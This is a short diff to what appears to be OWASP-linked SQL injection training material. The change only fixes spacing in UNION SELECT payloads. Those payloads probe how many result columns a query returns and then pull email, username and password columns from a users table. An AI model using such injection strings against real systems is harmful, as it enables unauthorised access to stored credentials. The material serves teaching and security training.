@@ -176,22 +176,22 @@ returning all records with "owasp" somewhere in the title.
 Static values are useful to probe for the right number of result set columns:
 
 ```
-'UNION SELECT 1 FROM users--
+' UNION SELECT 1 FROM users--
 ```
 
 ```sql
-'UNION SELECT 1,2 FROM users--
+' UNION SELECT 1,2 FROM users--
 ```
 
 ```sql
-'UNION SELECT 1,2,3 FROM users--
+' UNION SELECT 1,2,3 FROM users--
 ```
 
 1=:-1:, 2=:-1:, 3=:+1:!
 
 Now only some actual column names have to be guessed or inferred:
 ```sql
-'UNION SELECT email,username,passwd FROM users--
+' UNION SELECT email,username,passwd FROM users--
 ```
 
 ---
